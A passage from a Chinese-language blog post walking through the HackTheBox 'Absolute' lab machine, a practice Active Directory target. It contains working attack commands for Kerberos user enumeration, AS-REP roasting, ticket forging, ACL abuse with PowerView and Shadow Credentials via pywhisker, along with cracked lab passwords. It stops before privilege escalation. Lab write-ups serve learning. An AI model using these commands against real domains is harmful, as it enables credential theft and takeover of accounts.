<!DOCTYPE html>


<html theme="dark" showBanner="true" hasBanner="desktop" > 
<link href="/fontawesome/css/fontawesome.css" rel="stylesheet">
<link href="/fontawesome/css/brands.css" rel="stylesheet">
<link href="/fontawesome/css/solid.css" rel="stylesheet">
<script src="/js/color.global.min.js" ></script>
<script src="/js/load-settings.js" ></script>
<head>
  <meta charset="utf-8">
  
  
  <title>HackTheBox Absolute | F4miti0n&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="打开靶机，得到IP:10.10.11.181。用nmap扫描一下，因为我其实是看着wp写的，这里就不装模做样的等着从头开始扫了。不管怎么说，最后得到的结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748PORT     STATE SERVICE       VERS">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox Absolute">
<meta property="og:url" content="http://example.com/2023/10/09/Absolute/index.html">
<meta property="og:site_name" content="F4miti0n&#39;s Blog">
<meta property="og:description" content="打开靶机，得到IP:10.10.11.181。用nmap扫描一下，因为我其实是看着wp写的，这里就不装模做样的等着从头开始扫了。不管怎么说，最后得到的结果如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748PORT     STATE SERVICE       VERS">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://example.com/images/cover14.jpg">
<meta property="article:published_time" content="2023-10-09T08:13:00.000Z">
<meta property="article:modified_time" content="2023-10-09T10:01:18.482Z">
<meta property="article:author" content="F4miti0n">
<meta property="article:tag" content="HackTheBox">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/images/cover14.jpg">
  
    <link rel="alternate" href="/atom.xml" title="F4miti0n's Blog" type="application/atom+xml">
  
  
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: light)" href="/images/favicon-light-192.png" sizes="192x192">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-32.png" sizes="32x32">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-128.png" sizes="128x128">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-180.png" sizes="180x180">
    <link rel="icon" media="(prefers-color-scheme: dark)" href="/images/favicon-dark-192.png" sizes="192x192">
  
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  
  
    
<div id="banner" class="">
  <img src="/images/banner.png" itemprop="image">
  <div id="banner-dim"></div>
</div>
 
   
  <div id="main-grid" class="shadow   ">
    <div id="nav" class=""  >
      <navbar id="navbar">
  <nav id="title-nav">
    <a href="/">
      <div id="vivia-logo">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
      </div>
      <div>F4miti0n's Blog </div>
    </a>
  </nav>
  <nav id="main-nav">
    
      <a class="main-nav-link" href="/">Home</a>
    
      <a class="main-nav-link" href="/archives">Archives</a>
    
      <a class="main-nav-link" href="/about">About</a>
    
  </nav>
  <nav id="sub-nav">
    <a id="theme-btn" class="nav-icon">
      <span class="material-symbols-rounded light-mode-icon">wb_sunny</span>
      <span class="material-symbols-rounded dark-mode-icon">dark_mode</span>
    </a>
    
      <a id="nav-rss-link" class="nav-icon mobile-hide" href="/atom.xml" title="RSS Feed">
        <span class="material-symbols-rounded rss">rss_feed</span>
      </a>
    
    <a id="nav-search-btn" class="nav-icon" title="Search" style="display: none;">
      <span class="material-symbols-rounded">search</span>
    </a>
    <div id="nav-menu-btn" class="nav-icon">
      <span class="material-symbols-rounded">menu</span>
    </div>
  </nav>
</navbar>
<div id="nav-dropdown" class="hidden">
  <div id="dropdown-link-list">
    
      <a class="nav-dropdown-link" href="/">Home</a>
    
      <a class="nav-dropdown-link" href="/archives">Archives</a>
    
      <a class="nav-dropdown-link" href="/about">About</a>
    
    
      <a class="nav-dropdown-link" href="/atom.xml" title="RSS Feed">RSS</a>
     
    </div>
</div>
<script>
  let dropdownBtn = document.getElementById("nav-menu-btn");
  let dropdownEle = document.getElementById("nav-dropdown");
  dropdownBtn.onclick = function() {
    dropdownEle.classList.toggle("hidden");
  }
</script>
    </div>
    <div id="sidebar-wrapper">
      <sidebar id="sidebar">
  
    <div class="widget-wrap">
  <div class="info-card">
    <div class="avatar">
      
        <image src=/images/avatar.png></image>
      
      <div class="img-dim"></div>
    </div>
    <div class="info">
      <div class="username">F4miti0n </div>
      <div class="dot"></div>
      <div class="subtitle">每天都在对抗无趣的生活 </div>
      <div class="link-list">
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://twitter.com" title="Twitter"><i class="fa-brands fa-twitter"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://store.steampowered.com" title="Steam"><i class="fa-brands fa-steam"></i></a>
        
          <a class="link-btn" target="_blank" rel="noopener" href="https://github.com" title="GitHub"><i class="fa-brands fa-github"></i></a>
         
      </div>  
    </div>
  </div>
</div>

  
  <div class="sticky">
    
      



    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Tags</h3>
      <ul class="widget-tag-list" itemprop="keywords"><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E5%A4%8D%E7%8E%B0/" rel="tag">CTF复现</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/CTF%E6%80%BB%E7%BB%93/" rel="tag">CTF总结</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag">Java安全</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F/" rel="tag">安卓渗透</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E9%97%B2%E8%B0%88/" rel="tag">闲谈</a></li></ul>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Archives</h3>
      
      
        <a class="archive-link" href="/archives/2024/01 ">
          January 2024 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/10 ">
          October 2023 
          <div class="archive-count">3 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/09 ">
          September 2023 
          <div class="archive-count">6 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/08 ">
          August 2023 
          <div class="archive-count">7 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/07 ">
          July 2023 
          <div class="archive-count">1 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/05 ">
          May 2023 
          <div class="archive-count">3 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/04 ">
          April 2023 
          <div class="archive-count">2 </div>
        </a>
      
        <a class="archive-link" href="/archives/2023/03 ">
          March 2023 
          <div class="archive-count">1 </div>
        </a>
      
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2024/01/01/2023%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/">
            <div class="recent-link-text">
              关于2023的年度总结
            </div>
          </a>
        
          <a class="recent-link" href="/2023/10/20/bugku%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%952/">
            <div class="recent-link-text">
              bugku渗透测试2
            </div>
          </a>
        
          <a class="recent-link" href="/2023/10/14/APT/">
            <div class="recent-link-text">
              HackTheBox APT
            </div>
          </a>
        
          <a class="recent-link" href="/2023/10/09/Absolute/">
            <div class="recent-link-text">
              HackTheBox Absolute
            </div>
          </a>
        
          <a class="recent-link" href="/2023/09/19/SnakeYaml%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AE%80%E6%9E%90/">
            <div class="recent-link-text">
              SnakeYaml反序列化简析
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div>
</sidebar>
    </div>
    <div id="content-body">
       

<article id="post-Absolute" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_clo9njg7c0006aktzezx8b9ta">
        <img src="/images/cover14.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        HackTheBox Absolute
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2023-10-09T08:13:00.000Z" itemprop="datePublished">2023-10-09</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
    Uncategorized 
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            4.8k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <p>打开靶机，得到IP:10.10.11.181。用nmap扫描一下，因为我其实是看着wp写的，这里就不装模做样的等着从头开始扫了。不管怎么说，最后得到的结果如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53/tcp   open  domain        Simple DNS Plus</span><br><span class="line">80/tcp   open  http          Microsoft IIS httpd 10.0</span><br><span class="line">|_http-server-header: Microsoft-IIS/10.0</span><br><span class="line">|_http-title: Absolute</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Potentially risky methods: TRACE</span><br><span class="line">88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-09-21 16:10:37Z)</span><br><span class="line">139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-09-21T16:11:40+00:00; +6h59m57s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2023-07-17T21:11:52</span><br><span class="line">|_Not valid after:  2024-07-16T21:11:52</span><br><span class="line">445/tcp  open  microsoft-ds?</span><br><span class="line">464/tcp  open  kpasswd5?</span><br><span class="line">593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2023-07-17T21:11:52</span><br><span class="line">|_Not valid after:  2024-07-16T21:11:52</span><br><span class="line">|_ssl-date: 2023-09-21T16:11:41+00:00; +6h59m57s from scanner time.</span><br><span class="line">3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-09-21T16:11:40+00:00; +6h59m56s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2023-07-17T21:11:52</span><br><span class="line">|_Not valid after:  2024-07-16T21:11:52</span><br><span class="line">3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: absolute.htb0., Site: Default-First-Site-Name)</span><br><span class="line">|_ssl-date: 2023-09-21T16:11:41+00:00; +6h59m57s from scanner time.</span><br><span class="line">| ssl-cert: Subject: commonName=dc.absolute.htb</span><br><span class="line">| Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.absolute.htb</span><br><span class="line">| Not valid before: 2023-07-17T21:11:52</span><br><span class="line">|_Not valid after:  2024-07-16T21:11:52</span><br><span class="line">Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 6h59m56s, deviation: 0s, median: 6h59m56s</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   3.1.1: </span><br><span class="line">|_    Message signing enabled and required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2023-09-21T16:11:26</span><br><span class="line">|_  start_date: N/A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/s</span><br></pre></td></tr></table></figure>

<p>发现开了<code>ldap</code>和<code>kerberos</code>服务，由此判断这应该是一台仿DC的靶机。除了这两项服务以外，我们还发现这台机子是支持<code>http</code>服务的，我们访问一下看看。</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921172126.png"></p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921172107.png"></p>
<p>访问之后说实话，啥也看不出来，连个交互点都没有，应该是个纯静态的站，故此也就不考虑从web撕口子了。但是F12查页面源码，发现这里的<code>jpg</code>图片名称还是挺有规律的，可以直接下载下来。相关命令如下，还是挺简单的。<br><code>for i in &#123;1..10&#125;;do wget http://10.10.11.181/images/hero_$&#123;i&#125;.jpg;done;</code></p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921174121.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921174254.png"></p>
<p>下载到本地之后，随便挑个图片查下信息，发现<code>Artist</code>和<code>Author</code>这两行，比较引人注意。<code>grep+awk</code>提取一下，得到了以上人名列表。这里要根据这个人名列表推测一下可能的用户名（中国人真的很难推英文名诶），然后把可能的用户名保存到一个txt文件里，开始域内用户枚举。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921175717.png"></p>
<p>用kerberute域内用户枚举之前，记得先把hosts文件给改一下。枚举的命令如图所示，以后直接套模板即可（sudo加不加都行），最终是得到了5个可用用户。<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921180529.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921181216.png"></p>
<p>和<code>Forest</code>靶机的步骤差不多，到这一步我们可以用<code>GetNPuser.py</code>。<br> 查一查这里面的用户有没有谁把身份预验证机制给关闭了，命令如下</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F &quot;@&quot; &#x27;&#123;print $1&#125;&#x27; /home/f4miti0n/桌面/username.txt | xargs -I&#123;&#125; python3 GetNPUsers.py absolute.htb/&#123;&#125; -request -no-pass -dc-ip 10.10.11.181</span><br></pre></td></tr></table></figure>

<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921195041.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921182246.png"></p>
<p>发现<code>d.klay</code>这个用户可以返回<code>TGT</code>，把这个<code>TGT</code> 保存到本地，用<code>john</code>破解一下，得到密码<code>Darkmoonsky248girl</code></p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921200312.png"></p>
<p>拿到密码了，<code>ldap</code>和<code>smb</code>啥的都可以试试了，换以前的话肯定是<code>ldapsearch</code>和<code>smbclient</code>一顿乱连，但我先看了wp，发现原来<code>crackmapexec</code>早把集成给做好了，直接一把梭。</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921205311.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230921223303.png"></p>
<p>梭梭梭，梭不出来，确实不会用<code>crackmapexec</code>，返回结果都没弄明白，这里是查了才知道<code>STATUS_ACCOUNT_RESTRICTION</code> 通常意味着禁用了NTLM，并且需要使用<code>Kerberos</code>进行身份验证。这里要想办法伪造一下TGT了，直接调整时差<code>impacket-getTGT</code>伪造开梭</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ntpdate -u dc.absolute.htb</span><br><span class="line">impacket-getTGT &#x27;absolute.htb/d.klay:Darkmoonsky248girl&#x27; -dc-ip dc.absolute.htb</span><br><span class="line">export KRB5CCNAME=$(pwd)/d.klay.ccache </span><br></pre></td></tr></table></figure>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926171059.png"></p>
<p>利用刚才生成的票据，配合<code>crackmapexec</code>链接，得到以下结果。这里要吐槽一下这个<code>export</code>导出变量儿。那个新建的变量是临时的，只在当前会话下管用。一开始把这茬忽略了，一直都是跑到<code>crackmapexec</code>目录下新开终端跑<code>ldap</code>，一直都连不上，就挺烦人。</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926171240.png"></p>
<p>仔细看看上图，发现<code>svc_smb</code>这个账户别有洞天，一看就是个能连<code>smb</code>的好账户，旁边还贴心的把密码给我们了，我们按照上面的流程重新伪造一下<code>TGT</code>链接<code>smb</code>试试 (<code>d.klay</code>读不了共享就很难受)</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926173809.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926174305.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926174157.png"></p>
<p>下了<code>test.exe</code>和<code>compiler.sh</code>这俩文件，其实按照普通靶机来讲，我这都拿到smb权限了，让我下个flag并不过分，但这个靶机是<code>insane</code>难度的，那也真没辙，接着分析一下test.exe (按常理讲应该是逆向分析的，但我怼着wp做，直接上wireshark)</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230926175637.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927084003.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927084040.png"></p>
<p>本来想在<code>linux</code>下用<code>wine</code>来执行<code>test.exe</code>的，但一执行就报错，我真的是哭死，最后还是老实上<code>win10</code>，用之前记得到<code>C:\Windows\System32\drivers\etc</code>把<code>host</code>文件的内容和<code>linux</code>的那个同步一下，整完这一套后抓到了一组新的用户名密码：<code>absolute.htb\m.lovegod:AbsoluteLDAP2022!</code>，简单用<code>crackmapexec</code>查一查，并没发现什么特殊的地方，用<code>bloodhound.py</code>远程收集一下域信息试试。</p>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927093435.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927173457.png"></p>
<p>发现了这么些个用户，个人感觉比较有意思的部分都放到左上角了，重点关注一下这个<code>WINRM_USER</code>，看名字就知道这个用户可以成为<code>evil-winrm</code>的利用对象，我们从当前的<code>m.lovegod</code>出发设置<code>StartNode</code>，看看如何才能拿下<code>winrm_user</code><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927173844.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927182253.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230927180845.png"><br>能够看到<code>M.LOVEGOD</code>对<code>NETWORK AUDIT</code>组有<code>own</code>权限，而<code>NETWORK AUDIT</code>组又对<code>WINRM_USER</code>有<code>GenericWrite</code>权限。虽然<code>M.LOVEGOD</code>不是<code>NETWORK AUDIT</code>的成员，没法直接控制<code>WINRM_USER</code>，但因为<code>own</code>权限的存在，我们只需要把<code>M/LOVEGOD</code>给加进<code>NETWORK AUDIT</code>就完事儿了。我们踏步进入AD域渗透步骤。</p>
<p>ps: 在Windows域中，<code>own</code> 权限是指用户对资源具有完全控制权限，包括读取、写入、修改和删除等操作</p>
<p>我们尽量在Windows的环境下来搞，Linux的稍有些麻烦，在进行操作之前我们要把DNS服务器设置一下，再把<code>Windows Defender</code>给关了防杀<code>PS</code><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928124600.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928124832.png"></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">// 导入 PowerView.ps1 和 Powermad.ps1 模块</span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1 </span><br><span class="line"><span class="built_in">Import-Module</span> .\Powermad.ps1 </span><br><span class="line">// 设置密码为 <span class="string">&quot;AbsoluteLDAP2022!&quot;</span> 并将其转换为安全字符串</span><br><span class="line"><span class="variable">$pass</span>=<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;AbsoluteLDAP2022!&#x27;</span> <span class="literal">-AsPlain</span> <span class="literal">-Force</span> </span><br><span class="line">// 创建一个包含凭据的 <span class="built_in">PS</span> 身份验证对象，凭据包括用户名 <span class="string">&#x27;absolute.htb\m.lovegod&#x27;</span> 和密码 <span class="string">&#x27;AbsoluteLDAP2022!&#x27;</span>。 </span><br><span class="line"><span class="variable">$cred</span>=<span class="built_in">new-object</span> system.management.automation.pscredential(<span class="string">&#x27;absolute.htb\m.lovegod&#x27;</span>,<span class="variable">$pass</span>)</span><br><span class="line">// 向 <span class="string">&quot;Network Audit&quot;</span> 对象授予 <span class="string">&quot;m.lovegod&quot;</span> 用户所有权限，使用提供的凭据连接到域控制器 <span class="string">&quot;dc.absolute.htb&quot;</span>。</span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;Network Audit&quot;</span> <span class="literal">-Rights</span> all <span class="literal">-DomainController</span> <span class="string">&quot;dc.absolute.htb&quot;</span> <span class="literal">-PrincipalIdentity</span> <span class="string">&quot;m.lovegod&quot;</span> </span><br><span class="line">// 将用户 <span class="string">&quot;m.lovegod&quot;</span> 添加到 <span class="string">&quot;Network Audit&quot;</span> 组中，使用提供的凭据连接到域 <span class="string">&quot;absolute.htb&quot;</span>。 <span class="built_in">Add-DomainGroupMember</span> <span class="literal">-Credential</span> <span class="variable">$cred</span> <span class="literal">-Identity</span> <span class="string">&quot;Network Audit&quot;</span> <span class="literal">-member</span> m.lovegod <span class="literal">-Domain</span> <span class="string">&quot;absolute.htb&quot;</span> </span><br><span class="line">// 获取属于 <span class="string">&quot;Network Audit&quot;</span> 组的成员列表，并以成员名的格式进行输出。</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>结果如下，成功将其加入<code>Network Audit</code>组<br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928130832.png"><br>加入进<code>Network Audit</code>组以后，需要重新生成<code>TGT</code>。然后再通过<code>pkwhisker.py</code>来修改属性申请<code>.pfx</code>私钥证书，pywhisker下载地址：<a target="_blank" rel="noopener" href="https://github.com/ShutdownRepo/pywhisker">https://github.com/ShutdownRepo/pywhisker</a><br><code>python pywhisker.py -d absolute.htb -u &quot;m.lovegod&quot; -k --no-pass -t &quot;winrm_user&quot; --action &quot;add&quot;</code><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928132532.png"><br>拿到私钥文件后，再使用<code>PKINTtool</code>获取<code>winrm</code>的<code>TGT</code><br><code>PKINTtool</code>下载地址:  <a target="_blank" rel="noopener" href="https://github.com/dirkjanm/PKINITtools">https://github.com/dirkjanm/PKINITtools</a></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.11 gettgtpkinit.py absolute.htb/winrm_user -cert-pfx /home/f4miti0n/桌面/xx/pywhisker-main/ypGDUuw9.pfx -pfx-pass wYSyHawOtHjT9jVixYmC winrmCcache</span><br></pre></td></tr></table></figure>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928164322.png"><br>成功拿到了winrm的TGT票据,<code>export</code>一下之后拿<code>evil-winrm</code>链接，这里就算成功拿到了普通用户权限，昂首踏步进入提权阶段 </p>
<p>ps:链接之前一定要把<code>/etc/krb5.conf</code>给配置好了再来，看着wp一通做没配卡了挺长时间。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[libdefaults]  </span><br><span class="line">        default_realm = ABSOLUTE.HTB  </span><br><span class="line">[realms]  </span><br><span class="line">        ABSOLUTE.HTB = &#123;  </span><br><span class="line">                kdc = DC.ABSOLUTE.HTB  </span><br><span class="line">                admin_server = ABSOLUTE.HTB  </span><br><span class="line">                &#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928165542.png"><br><img src="https://hexo--blog--images.oss-cn-beijing.aliyuncs.com/Absolute/Pasted%20image%2020230928170413.png"></p>
<hr>
<p>在进入提权阶段前先碎碎念一会儿，简单解释一下这里到底对<code>winrm</code>这个用户做了些什么。在<code>Kerberos</code>认证协议中，<code>TGT</code>只能通过验证一个名为 “预认证 “的第一步来获得，预认证可以以对称方式（用DES、RC4、AES128或AES256密钥）或非对称方式（用证书）进行验证，而非对称的预认证方式被称其为<code>PKINIT</code> 。<code>PKINIT</code>是一个Kerberos协议的扩展协议，允许Kerberos预认证阶段中使用非对称密钥进行加密。基于PKINIT协议，客户端使用自身私钥对预验证数据（Pre-authentication Data）进行加密，KDC使用客户端的公钥进行解密（与数字证书相似），若KDC成功使用公钥解密，则返回<code>TGT</code>票据。</p>
<p>很不巧的是，KDC用于解密的公钥是可以被设置在指定目标的<code>msDs-KeyCredentialLink</code>属性上的，而我们又恰好拥有修改<code>msDs-KeyCredentialLink</code>的权限（别忘了，我们是<code>GenericWrite</code>），所以我们自然能很轻松地拿到<code>winrm</code>的<code>TGT</code>，这里的<code>pywhisker.py</code>是在修改<code>winrm</code>的<code>msDs-KeyCredentialLink</code>为我们的特定公钥，<code>gettgtpkint.py</code>则是在启动这一套<code>pkint</code>验证流程。</p>
<p>ps: 我们把这一套流程叫做<code>Shadow Credentials</code>，更多信息可以来学一下这篇文章，写的非常nice<br><a target="_blank" rel="noopener" href="https://forum.butian.net/share/1607">https://forum.butian.net/share/1607</a> </p>
<hr>
<p>提权阶段用到的攻击手段是<code>Kerberos中继攻击</code>，和之前在<code>Responder</code>用到的<code>NTLM中继</code>还有些许不同之处，我们先来学习一下。</p>
